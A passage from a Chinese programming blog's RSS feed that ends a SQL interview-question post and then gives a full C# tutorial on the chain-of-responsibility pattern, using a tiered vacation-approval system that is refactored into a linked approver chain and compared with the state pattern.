or end_date is null) e 
left join
(select worker_name,min(sign_time) st 
from sign_log group by worker_name) k 
on e.worker_name = k.worker_name) ck)res;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200318181406195.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最终结果还是非常完美的，如果小伙伴有更好的意见，欢迎留言讨论~&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 08 Jul 2020 15:24:00 +0000</pubDate>
<dc:creator>云祁</dc:creator>
<og:description>师兄在面试时遇到了这条SQL题，回来我帮他参谋了下，觉得非常有意思，让我们一起来看看这道差点吊打师兄的笔试题吧！</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/beiisbei/p/13269964.html</dc:identifier>
</item>
<item>
<title>权力越大职责越大——C#中的职责链模式 - 老胡写代码</title>
<link>http://www.cnblogs.com/deatharthas/p/13269889.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/deatharthas/p/13269889.html</guid>
<description>&lt;p&gt;大家好，欢迎来到老胡的博客，今天我们继续了解设计模式中的职责链模式，这是一个比较简单的模式。跟往常一样，我们还是从一个真实世界的例子入手，这样大家也对这个模式的应用场景有更深刻的理解。&lt;br/&gt; &lt;/p&gt;
&lt;h4 id=&quot;一个真实的栗子&quot;&gt;一个真实的栗子&lt;/h4&gt;
&lt;p&gt;作为上班族，相信大家对请假都不陌生，每个公司都有自己请假的流程，稍微讲究点的公司还会有细致的规定，比如，3天以内的假期，小组长有权力批准，3天以上的假期就要找更高级别的领导批准。这种制度就是典型的权力越大职责越大——毕竟，批长假的职责只在高级主管那里存在。&lt;/p&gt;
&lt;p&gt;除了规定出这样细致的要求之外，大部分公司还有用软件实现了请假流程，当请假人员提出请假申请的时候，会依据请假天数，转发给具有权限的人员审批，让我们看看这个系统的代码实现吧。&lt;br/&gt; &lt;/p&gt;
&lt;h5 id=&quot;请假系统实现&quot;&gt;请假系统实现&lt;/h5&gt;
&lt;p&gt;在这个系统中，我们假定：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;小组长可以审批3天以内的请假请求&lt;/li&gt;
&lt;li&gt;部门经理可以审批5天以内的请假请求&lt;/li&gt;
&lt;li&gt;10天以内的请假请求只有老板才能审批&lt;/li&gt;
&lt;li&gt;我们同时假定，这个公司的管理层非常人性化，请假都能得到批准，除非大于10天，因为这种情况没人可以审批&lt;br/&gt; &lt;/li&gt;
&lt;/ul&gt;&lt;h6 id=&quot;请假申请&quot;&gt;请假申请&lt;/h6&gt;
&lt;p&gt;这是最简单的类，封装了请假天数和请假申请人&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;class VacationRequest
{
    public int DayNum { get; set; }
    public string RequesterName { get; set; }
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;h6 id=&quot;假期审批者&quot;&gt;假期审批者&lt;/h6&gt;
&lt;p&gt;首先创建一个抽象类，假期审批者，封装假期审批的基本逻辑，即，如果当前人员有权限审批当前假期申请，就处理&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;abstract class VacationApprover
{        
    protected VacationApprover(int dayCanHandle)
    {
        DayCanHandle = dayCanHandle;
    }

    public int DayCanHandle { get; protected set; }

    public void HandleVacationRequest(VacationRequest request)
    {
        if (request.DayNum &amp;lt;= DayCanHandle)
        {
            DoHandleVacationRequest(request);
        }
    }

    protected abstract void DoHandleVacationRequest(VacationRequest request);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然，抽象类只需要确定算法骨架，限定只有当前人员能处理这个请求的时候，才进行审批工作，至于具体的审批实现，留给子类自己去覆盖，这种在父类固定算法骨架，暴露部分覆盖点给子类的做法，就是之前我们提到过的&lt;a href=&quot;https://www.cnblogs.com/deatharthas/p/13041420.html&quot;&gt;TemplateMethod模式&lt;/a&gt;&lt;br/&gt; &lt;/p&gt;
&lt;h6 id=&quot;具体假期审批者&quot;&gt;具体假期审批者&lt;/h6&gt;
&lt;p&gt;小组长，部门经理，老板，都在这里创建，他们分别处理能审批3、5、10天的请假申请&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;class TeamLeader : VacationApprover
{
    private const int DAY_CAN_HANDLE_TEAMLEADER = 3;
    public TeamLeader() : base(DAY_CAN_HANDLE_TEAMLEADER) { }

    protected override void DoHandleVacationRequest(VacationRequest request)
    {
        Console.WriteLine(&quot;Now team leader handle this request&quot;);
        Console.WriteLine(&quot;Team leader accept this request&quot;);
    }
}

class DepartmentLeader : VacationApprover
{
    private const int DAY_CAN_HANDLE_DEPARTMENTLEADER = 5;
    public DepartmentLeader() : base(DAY_CAN_HANDLE_DEPARTMENTLEADER) { }

    protected override void DoHandleVacationRequest(VacationRequest request)
    {
        Console.WriteLine(&quot;Now department leader handle this request&quot;);
        Console.WriteLine(&quot;Department leader accept this request&quot;);
    }
}

class Boss : VacationApprover
{
    private const int DAY_CAN_HANDLE_BOSS = 10;
    public Boss() : base(DAY_CAN_HANDLE_BOSS) { }

    protected override void DoHandleVacationRequest(VacationRequest request)
    {
        Console.WriteLine(&quot;Now boss handle this request&quot;);
        Console.WriteLine(&quot;Boss accept this request&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;h6 id=&quot;请假审批系统&quot;&gt;请假审批系统&lt;/h6&gt;
&lt;p&gt;请假审批系统提供统一请假申请接口，内部通过请假天数决定哪个审批者参与审批&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;class VacationApproveSystem
{
    private VacationApprover teamLeader = new TeamLeader();
    private VacationApprover departmentLeader = new DepartmentLeader();
    private VacationApprover boss = new Boss();

    public void HandleVacationRequest(VacationRequest request)
    {
        Console.WriteLine(&quot;Now handle {0}'s {1} days' vacation request&quot;, request.RequesterName, request.DayNum);

        if (request.DayNum &amp;lt;= teamLeader.DayCanHandle)
        {
            teamLeader.HandleVacationRequest(request);
        }
        else if (request.DayNum &amp;lt;= departmentLeader.DayCanHandle)
        {
            departmentLeader.HandleVacationRequest(request);
        }
        else if (request.DayNum &amp;lt;= boss.DayCanHandle)
        {
            boss.HandleVacationRequest(request);
        }
        else
        {
            Console.WriteLine(&quot;Cannot handle this request after all&quot;);
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;h6 id=&quot;测试代码&quot;&gt;测试代码&lt;/h6&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;class Program
{
    static void Main(string[] args)
    {
        VacationApproveSystem system = new VacationApproveSystem();

        system.HandleVacationRequest(new VacationRequest() { DayNum = 5, RequesterName = &quot;laohu&quot; });

        system.HandleVacationRequest(new VacationRequest() { DayNum = 10, RequesterName = &quot;laohu&quot; });

        system.HandleVacationRequest(new VacationRequest() { DayNum = 12, RequesterName = &quot;laohu&quot; });
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;结果显示&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/699616/202007/699616-20200708230407405-1842054004.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;一切都是正常的，当5天时，部门经理审批，10天时，老板审批，大于10天无人能批。 Good job。&lt;br/&gt; &lt;/p&gt;
&lt;h4 id=&quot;回头看看&quot;&gt;回头看看&lt;/h4&gt;
&lt;p&gt;实现了第一版代码之后，我们再回过头看看，虽然代码功能无误，但是&lt;strong&gt;VacationApproveSystem&lt;/strong&gt;似乎承担了过多的职责，它不但需要提供统一的请假审批接口给最终用户，它同时还需要知道每个请假审批者能审批的请假天数并在内部实现请假请求转发给不同审批者的逻辑。这样既违反了迪米特法则——它知道的太多了，也违反了开闭原则——如果任何一个审批者修改了自身能审批的请假天数，这个类都会被波及，最后，它还违反了单一职责——一个类只能有一个引起变化的原因。&lt;/p&gt;
&lt;p&gt;有鉴于此，我们这版代码只能算凑合用，但远远谈不上结构良好，老老实实地重构代码吧，下面请出我们今天的主角。&lt;br/&gt; &lt;/p&gt;
&lt;h4 id=&quot;职责链模式&quot;&gt;职责链模式&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/699616/202007/699616-20200708230443830-1289242990.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;解耦具体对象和请求，使得多个对象都有机会处理请求。将对象连成一条链，沿着链传递请求直到有对象处理它&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;乍一听有点生涩，翻译一下就是&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;解耦具体对象和请求——不要预先指定哪个对象来处理此请求（因为很多时候并不知道）&lt;/li&gt;
&lt;li&gt;使多个对象都有机会——有一众候选对象，具体使用哪个对象是在运行时决定的&lt;/li&gt;
&lt;li&gt;连成链传递请求——像链表一样，要在对象中体现出对象之间的链关系，而不要通过其他类以if..else的方式实现&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以，这么看来这个模式和我们的例子简直是绝配，我们已经做了大部分的工作了，现在剩下的就只是修改审批者，让审批者能&lt;strong&gt;链&lt;/strong&gt;起来&lt;br/&gt; &lt;/p&gt;
&lt;h4 id=&quot;代码重构&quot;&gt;代码重构&lt;/h4&gt;
&lt;h5 id=&quot;修改请假审批基类&quot;&gt;修改请假审批基类&lt;/h5&gt;
&lt;p&gt;最重要的改动，就是修改基类，让对象能&lt;strong&gt;链&lt;/strong&gt;起来，在&lt;strong&gt;VacationApprover&lt;/strong&gt;中添加一个后继节点和一个设置后继节点的方法。同时在基类的审批方法中，完成请求传递，即，如果请假申请超过了当前审批人的能力范围，则转发至后继节点。修改后的类如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;abstract class VacationApprover
{
    private VacationApprover nextVacationApprover = null;

    public void SetNextVacationApprover(VacationApprover approver)
    {
        nextVacationApprover = approver;
    }

    protected VacationApprover(int dayCanHandle)
    {
        DayCanHandle = dayCanHandle;
    }

    public int DayCanHandle { get; protected set; }

    public void HandleVacationRequest(VacationRequest request)
    {
        if (request.DayNum &amp;lt;= DayCanHandle)
        {
            DoHandleVacationRequest(request);
        }
        else
        {
            if(nextVacationApprover != null)
            {
                nextVacationApprover.HandleVacationRequest(request);
            }
            else
            {
                Console.WriteLine(&quot;Cannot handle this request after all&quot;);
            }
        }
    }

    protected abstract void DoHandleVacationRequest(VacationRequest request);
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;h5 id=&quot;修改请假审批系统&quot;&gt;修改请假审批系统&lt;/h5&gt;
&lt;p&gt;基类重构结束之后，请假审批系统就可以瘦身了，删除了所有判断逻辑，仅仅在构造函数里面完成&lt;strong&gt;链&lt;/strong&gt;组建的工作，接着一键调用，齐活。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;class VacationApproveSystem
{
    private VacationApprover teamLeader = new TeamLeader();
    private VacationApprover departmentLeader = new DepartmentLeader();
    private VacationApprover boss = new Boss();

    public VacationApproveSystem()
    {
        teamLeader.SetNextVacationApprover(departmentLeader);
        departmentLeader.SetNextVacationApprover(boss);
    }

    public void HandleVacationRequest(VacationRequest request)
    {
        Console.WriteLine(&quot;Now handle {0}'s {1} days' vacation request&quot;, request.RequesterName, request.DayNum);

        teamLeader.HandleVacationRequest(request);
    }
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;h5 id=&quot;测试&quot;&gt;测试&lt;/h5&gt;
&lt;p&gt;其他请假审批子类和测试客户端都不需要改动，这次重构工作量非常小，运行代码，一切正常，重构成功。&lt;br/&gt; &lt;/p&gt;
&lt;h4 id=&quot;总结&quot;&gt;总结&lt;/h4&gt;
&lt;p&gt;这就是职责链模式的使用。和&lt;a href=&quot;https://www.cnblogs.com/deatharthas/p/13221496.html&quot;&gt;状态模式&lt;/a&gt;有点像，解决了以下问题：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过添加子类把一些逻辑判断从调用类（VaccationApproveSystem）移到子类的方式，使得调用类满足迪米特法则&lt;/li&gt;
&lt;li&gt;想在职责链上面添加更多节点的时候，只需要添加新类和修改链组装部分的代码，基本满足开闭原则（这里几乎不可能完全满足开闭原则，毕竟有修改就意味着我们肯定会改动VaccationApproveSystem类，只是我们应该尽量的让代码改动量少，以提高控制代码变动的能力）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;和状态模式一样，它也有子类爆炸的风险。&lt;/p&gt;
&lt;p&gt;可能有朋友会感到疑惑，既然职责链模式和状态模式看起来那么像，那它们有什么区别呢？它们的区别在于：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;状态模式中的对象是有状态的，可以随时通过接口查询对象的当前状态，对象正是因为有了不同的状态，才会表现出不同行为。而职责链模式中的对象没有状态，对象和链的关系更像请求和处理管线的关系，没有接口能告诉我们当前在处理管线的哪个节点，也没有意义这么做，我们只关心请求是否被处理了&lt;/li&gt;
&lt;li&gt;状态模式中的状态切换可以是无序的，比如，一个游戏角色，当他的状态是虚弱的时候，可以通过治疗，转换成健康，也可以通过受伤转换成濒死。而职责链中的请求转发就只有向前一条路，从小组长到部门经理，从部门经理到老板&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;根据不同的情景，选择合适的模式，才是正确的使用之道&lt;/strong&gt;。以上就是今天的内容，希望大家喜欢，我们下次见！&lt;/p&gt;
</description>
<pubDate>Wed, 08 Jul 2020 15:07:00 +0000</pubDate>
<dc:creator>老胡写代码</dc:creator>
<og:description>大家好，欢迎来到老胡的博客，今天我们继续了解设计模式中的职责链模式，这是一个比较简单的模式。跟往常一样，我们还是从一个真实世界的例子入手，这样大家也对这个模式的应用场景有更深刻的理解。 一个真实的栗子</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/deatharthas/p/13269889.html</dc:identifier>
</item>
</channel>
</rss>